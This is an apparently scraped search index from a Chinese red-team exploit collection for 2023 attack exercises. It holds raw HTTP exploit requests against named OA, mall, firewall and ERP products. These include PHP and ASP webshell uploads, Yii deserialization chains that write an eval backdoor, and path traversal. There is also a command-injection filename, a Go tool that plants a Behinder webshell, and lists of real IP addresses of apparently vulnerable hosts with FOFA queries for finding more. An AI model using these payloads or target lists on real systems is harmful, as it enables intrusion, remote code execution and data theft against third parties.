AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=f3b775b1f757845ed540428144c2c797 Connection: close ","date":"2023-12-08","objectID":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-invite_one_member.php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"福建科立讯通信有限公司指挥调度管理平台 invite_one_member.php命令执行漏洞","uri":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-invite_one_member.php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"指挥调度管理平台\" -D unionpbx -T local_users -C usr_number usr_password sign=md5($usernumber.$timestamp.$_usr_password); ","date":"2023-12-08","objectID":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"福建科立讯通信有限公司指挥调度管理平台 任意文件上传","uri":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"Exp1 api/client/upload_msg_file.php POST /api/client/upload_msg_file.php?sign=f67e784ea8458572f133d83dd0f617e6×tamp=1628848416067\u0026usernumber=1035 HTTP/1.1 Host: 111.21.226.162:7080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=8c3050f5f7ab5c1d49dbe73dcc7a8d8e Connection: close Content-Length: 273 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxzUhGld6cusN3Alk ------WebKitFormBoundaryxzUhGld6cusN3Alk Content-Disposition: form-data; name=\"type\" 1 ------WebKitFormBoundaryxzUhGld6cusN3Alk Content-Disposition:form-data; name=\"file\"; filename=\"1.php\" Content-Type: image/jpeg 11123 ------WebKitFormBoundaryxzUhGld6cusN3Alk-- ","date":"2023-12-08","objectID":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw"],"title":"福建科立讯通信有限公司指挥调度管理平台 任意文件上传","uri":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"exp2 custom/zx/fax/send_fax.php POST /custom/zx/upload_msg_file.php?sign=f67e784ea8458572f133d83dd0f617e6×tamp=1628848416067\u0026usernumber=1035 HTTP/1.1 Host: 111.21.226.162:7080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=8c3050f5f7ab5c1d49dbe73dcc7a8d8e Connection: close Content-Length: 304 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5QxDE3I4sjzDvg3O ------WebKitFormBoundary5QxDE3I4sjzDvg3O Content-Disposition: form-data; name=\"type\" 1 ------WebKitFormBoundary5QxDE3I4sjzDvg3O Content-Disposition:form-data; name=\"file\"; filename=\"1.php\" Content-Type: image/jpeg \u003c?php phpinfo(); unlink(__FILE__);?\u003e ------WebKitFormBoundary5QxDE3I4sjzDvg3O-- ","date":"2023-12-08","objectID":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":["2023hw"],"title":"福建科立讯通信有限公司指挥调度管理平台 任意文件上传","uri":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"https://blog.csdn.net/C20220511/article/details/125065817\r","date":"2023-12-08","objectID":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/:0:0","tags":["2023hw"],"title":"禾匠榜店商城系统","uri":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"fofa body=\"const _scriptUrl\" ","date":"2023-12-08","objectID":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/:1:0","tags":["2023hw"],"title":"禾匠榜店商城系统","uri":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"api/testOrderSubmit rce (CNVD-2022-51194) ","date":"2023-12-08","objectID":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/:2:0","tags":["2023hw"],"title":"禾匠榜店商城系统","uri":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"poc POST /web/index.php?r=api/testOrderSubmit/index/submit\u0026_mall_id=1 HTTP/1.1 Host: 8.129.117.188 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 233 form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D ","date":"2023-12-08","objectID":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/:2:1","tags":["2023hw"],"title":"禾匠榜店商城系统","uri":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"exp https://8.129.117.188/web/uploads/hejiang_1234.php?img=phpinfo(); POST /web/index.php?r=api/testOrderSubmit/index/preview\u0026_mall_id=1 HTTP/1.1 Host: 8.129.117.188 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 913 form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A3%3A%7Bs%3A32%3A%22%00GuzzleHttp%5CPsr7%5CFnStream%00method%22%3Ba%3A2%3A%7Bs%3A10%3A%22__toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A20%3A%22yii%5Crest%5CIndexAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22yii%5Cbase%5CView%22%3A0%3A%7B%7Di%3A1%3Bs%3A22%3A%22evaluateDynamicContent%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A132%3A%22file_put_contents%28%27uploads%2Fhejiang_1234.php%27%2Chex2bin%28%273c3f70687020406576616c28245f524551554553545b27696d67275d293b3f3e%27%29%29%3Bphpinfo%28%29%3B%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7Ds%3A14%3A%22_fn___toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A9%3A%22_fn_close%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A6%3Bi%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D ","date":"2023-12-08","objectID":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/:2:2","tags":["2023hw"],"title":"禾匠榜店商城系统","uri":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"index/submit rce ","date":"2023-12-08","objectID":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/:3:0","tags":["2023hw"],"title":"禾匠榜店商城系统","uri":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"poc phpinfo POST /web/index.php?r=api/testOrderSubmit/index/submit\u0026_mall_id=1 HTTP/1.1 Host: 1.14.246.165 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 233 form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D ","date":"2023-12-08","objectID":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/:3:1","tags":["2023hw"],"title":"禾匠榜店商城系统","uri":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"exp http://1.14.246.165/web/uploads/testA8e5baC.php?img=phpinfo(); POST /web/index.php?r=api/testOrderSubmit/index/preview\u0026_mall_id=1 HTTP/1.1 Host: 1.14.246.165 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 912 form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A3%3A%7Bs%3A32%3A%22%00GuzzleHttp%5CPsr7%5CFnStream%00method%22%3Ba%3A2%3A%7Bs%3A10%3A%22__toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A20%3A%22yii%5Crest%5CIndexAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22yii%5Cbase%5CView%22%3A0%3A%7B%7Di%3A1%3Bs%3A22%3A%22evaluateDynamicContent%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A131%3A%22file_put_contents%28%27uploads%2FtestA8e5baC.php%27%2Chex2bin%28%273c3f70687020406576616c28245f524551554553545b27696d67275d293b3f3e%27%29%29%3Bphpinfo%28%29%3B%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7Ds%3A14%3A%22_fn___toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A9%3A%22_fn_close%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A6%3Bi%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D URL http://1.14.246.165:8082http://1.14.246.165https://106.55.156.189https://110.40.151.135https://116.63.157.210https://shop.ldysq.comhttps://139.155.175.130https://14.29.177.126http://39.108.37.44https://47.101.142.110https://8.129.117.188 ","date":"2023-12-08","objectID":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/:3:2","tags":["2023hw"],"title":"禾匠榜店商城系统","uri":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"任意密码重置 POST /web/index.php?r=admin%2Fpassport%2Fedit-password HTTP/1.1 Host: www.xxx.com Cookie: （刷新登陆页获取绘画Cookie） 5form%5Bcaptcha%5D=lxcq\u0026form%5Bchecked%5D=false\u0026form%5Busername%5D=admin\u0026form%5Bpass%5D=admin8881\u0026form%5BcheckPass%5D=admin8881\u0026form%5Bmobile%5D=13800000001\u0026user_type=1\u0026mall_id=\u0026_csrf=Sb4pjMU6cTcrKLfqjwJWdhm-d5Zt7J1BWiFUZtiLoDRx9mHJlnAFel9N06G_VhgbL89C_C66-gY2agFTiurvYA%3D%3D ","date":"2023-12-08","objectID":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/:4:0","tags":["2023hw"],"title":"禾匠榜店商城系统","uri":"/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"changeAccount('8000')\" ","date":"2023-12-08","objectID":"/%E7%A7%91%E8%8D%A3-aio-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-utilservlet-%E6%96%87%E4%BB%B6-filename-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"科荣 AIO 管理系统 UtilServlet 文件 fileName 参数文件读取漏洞","uri":"/%E7%A7%91%E8%8D%A3-aio-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-utilservlet-%E6%96%87%E4%BB%B6-filename-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /UtilServlet HTTP/1.1 Host: 106.14.216.219:8000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cache-Control: no-cache Connection: close Content-Type: application/x-www-form-urlencoded Pragma: no-cache Upgrade-Insecure-Requests: 1 Content-Length: 63 operation=readErrorExcel\u0026fileName=../../website/WEB-INF/web.xml http://106.14.216.219:8000/UtilServlet http://106.14.216.219:8002/UtilServlet http://112.74.13.69:9005/UtilServlet http://112.74.13.69:9004/UtilServlet http://113.104.196.166:8000/UtilServlet http://113.118.86.7:8011/UtilServlet ","date":"2023-12-08","objectID":"/%E7%A7%91%E8%8D%A3-aio-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-utilservlet-%E6%96%87%E4%BB%B6-filename-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"科荣 AIO 管理系统 UtilServlet 文件 fileName 参数文件读取漏洞","uri":"/%E7%A7%91%E8%8D%A3-aio-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-utilservlet-%E6%96%87%E4%BB%B6-filename-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"竹云的信息泄漏\rPOST /admin-api/oauth/../admin/user/findlist {“pagesize”:5,“pageNumber”:1,“userName”:\"\"} 可以看到手机号、姓名、邮箱等 ","date":"2023-12-08","objectID":"/%E7%AB%B9%E4%BA%91-findlist-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/:0:0","tags":["2023hw"],"title":"竹云 findlist 信息泄漏","uri":"/%E7%AB%B9%E4%BA%91-findlist-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"},{"categories":["2023hw漏洞"],"content":"红帆OA iorepsavexml.aspx 文件上传漏洞 ","date":"2023-12-08","objectID":"/%E7%BA%A2%E5%B8%86oa-iorepsavexml.aspx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"红帆OA iorepsavexml.aspx 文件上传漏洞","uri":"/%E7%BA%A2%E5%B8%86oa-iorepsavexml.aspx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"exp package main import ( \"crypto/tls\" \"fmt\" \"github.com/hpifu/go-kit/hflag\" \"github.com/imroc/req/v3\" \"github.com/liushuochen/gotable\" \"github.com/thanhpk/randstr\" \"log\" \"net/http\" \"os\" \"strings\" \"time\" ) func main() { now := time.Now() param := getParam() uploader(param) fmt.Printf(\"[√] 速度还是挺快的就这么点时间%s就GetShell了.\", time.Since(now).String()) } func getParam() string { hflag.AddFlag(\"target\", \"海翔地址\", hflag.Required(), hflag.Shorthand(\"t\")) if err := hflag.Parse(); err != nil { fmt.Println(hflag.Usage()) os.Exit(0) } return hflag.GetString(\"target\") } func reqClient() *req.Client { cli := req.C() cli.SetAutoDecodeAllContentType() cli.SetRedirectPolicy(req.NoRedirectPolicy()) cli.SetTimeout(time.Second * 15) cli.SetTLSFingerprintSafari() cli.TLSClientConfig = \u0026tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS10, MaxVersion: tls.VersionTLS13} return cli } func uploader(target string) { shellName := randstr.Hex(8) + \".asp\" shellString := \"\u003c%\\nResponse.CharSet = \\\"UTF-8\\\" \\nk=\\\"e45e329feb5d925b\\\" \\nSession(\\\"k\\\")=k\\nsize=Request.TotalBytes\\ncontent=Request.BinaryRead(size)\\nFor i=1 To size\\nresult=result\u0026Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\\nNext\\nexecute(result)\\n%\u003e\\n\" vulUrl := strings.Replace(target+\"/ioffice/prg/set/report/iorepsavexml.aspx?key=writefile\u0026filename=\"+shellName+\"\u0026filepath=/upfiles/rep/pic/\", \"//io\", \"/io\", 1) client := reqClient() post, err := client.R().SetBody(shellString).Post(vulUrl) if err != nil { log.Println(err) return } defer func() { _ = post.Body.Close() }() if post.StatusCode != http.StatusOK { fmt.Println(\"GetShell Failed\") return } shellURL := strings.Replace(target+\"/ioffice/upfiles/rep/pic/\"+shellName, \"//io\", \"/io\", 1) get, _ := client.R().Get(shellURL) if get.StatusCode != http.StatusNotFound { create, _ := gotable.Create(\"Shell连接工具\", \"Shell连接地址\", \"Shell连接密码\") _ = create.AddRow([]string{ \"冰蝎\", shellURL, \"rebeyond\", }) fmt.Println(create) } defer func() { _ = get.Body.Close() }() } ","date":"2023-12-08","objectID":"/%E7%BA%A2%E5%B8%86oa-iorepsavexml.aspx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"红帆OA iorepsavexml.aspx 文件上传漏洞","uri":"/%E7%BA%A2%E5%B8%86oa-iorepsavexml.aspx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"yaml poc id: hongfanOA-iorepsavexml-aspx-GetShell info: name: 红帆OA iorepsavexml.aspx 文件上传漏洞 author: kyo severity: critical description: | 红帆OA在上传时可被绕过上传的限制 reference: - metadata: verified: true max-request: 2 fofa-query: title=\"iOffice.net\" tags: hongfan,oa,upload http: - raw: - | POST /ioffice/prg/set/report/iorepsavexml.aspx?key=writefile\u0026filename=qaxnb.txt\u0026filepath=/upfiles/rep/pic/ HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Content-Type: application/x-www-form-urlencoded Content-Length: 0 qaxnb - | GET /ioffice/upfiles/rep/pic/qaxnb.txt HTTP/1.1 Host: {{Hostname}} matchers: - type: dsl dsl: - 'status_code_1==200 \u0026\u0026 status_code_2 == 200' - 'contains(body_2, \"qaxnb\")' condition: and # digest: 4b0a00483046022100ace369b495c3c20753d111b9951b654c66682b38ecb89775c65cb0e9b23dd21d022100a9a3b446556750d6ecd73dff1605d01a1c60728720f4ee0c54654b1dcbd4c5d8:922c64590222798bb761d5b6d8e72951 ","date":"2023-12-08","objectID":"/%E7%BA%A2%E5%B8%86oa-iorepsavexml.aspx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"红帆OA iorepsavexml.aspx 文件上传漏洞","uri":"/%E7%BA%A2%E5%B8%86oa-iorepsavexml.aspx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"红帆OA zyy_AttFile.asmx SQL注入漏洞 POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1 Host: 10.250.250.5 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 383 Content-Type: text/xml; charset=utf-8 Soapaction: \"http://tempuri.org/GetFileAtt\" Accept-Encoding: gzip, deflate Connection: close \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\u003csoap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\u003csoap:Body\u003e\u003cGetFileAtt xmlns=\"http://tempuri.org/\"\u003e\u003cfileName\u003e123\u003c/fileName\u003e\u003c/GetFileAtt\u003e \u003c/soap:Body\u003e\u003c/so ap:Envelope\u003e ","date":"2023-12-08","objectID":"/%E7%BA%A2%E5%B8%86oa-zyy_attfile.asmx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"红帆OA zyy_AttFile.asmx SQL注入漏洞","uri":"/%E7%BA%A2%E5%B8%86oa-zyy_attfile.asmx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /postrev.php HTTP/1.1 Host: Content-Length: 252 Content-Type: multipart/form-data; boundary=—-WebKitFormBoundary4x5B9V0rUBOl9UnJ Connection: close ——WebKitFormBoundary4x5B9V0rUBOl9UnJ Content-Disposition: form-data; name=“filename”; filename=“1.jpg \u0026\u0026 ping dtq9.callback.red” Content-Type: image/jpeg ——WebKitFormBoundary4x5B9V0rUBOl9UnJ– ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-ads-postrev.php-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"绿盟 ads postrev.php 文件上传","uri":"/%E7%BB%BF%E7%9B%9F-ads-postrev.php-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"绿盟 NF 下一代防火墙 任意文件上传漏洞 POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef Host: --4803b59d015026999b45993b1245f0ef Content-Disposition: form-data; name=\"file\"; filename=\"compose.php\" \u003c?php eval($_POST['cmd']);?\u003e --4803b59d015026999b45993b1245f0ef-- POST /mail/include/header_main.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71 Host: cmd=phpinfo(); ","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-nf-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"绿盟 NF 下一代防火墙 任意文件上传漏洞","uri":"/%E7%BB%BF%E7%9B%9F-nf-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 绿盟 NF下一代防火墙 任意文件上传漏洞\r","date":"2023-12-08","objectID":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-bugsinfo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"绿盟 NF下一代防火墙 bugsInfo 任意文件上传漏洞","uri":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-bugsinfo-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 绿盟 SSLVPN 存在任意文件上传漏洞，攻击者通过发送特殊的请求包可以获取服务器权限，进行远程命令执行 